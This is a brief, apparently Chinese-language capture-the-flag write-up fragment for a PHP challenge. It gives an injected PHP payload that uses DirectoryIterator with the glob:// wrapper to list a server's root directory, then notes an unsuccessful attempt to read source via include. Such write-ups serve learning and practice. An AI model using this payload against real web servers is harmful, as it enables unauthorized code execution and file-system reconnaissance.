![image-20250404170744190](./assets/image-20250404170744190.png)



同上题





利用glob伪协议读取根目录

```
c=?><?php $a=new DirectoryIterator("glob:///*");foreach($a as $f){echo ($f->__toString().' ');}exit(0);?>
```

![image-20250404170943831](./assets/image-20250404170943831.png)



include读取源码

![image-20250404171111600](./assets/image-20250404171111600.png)

失败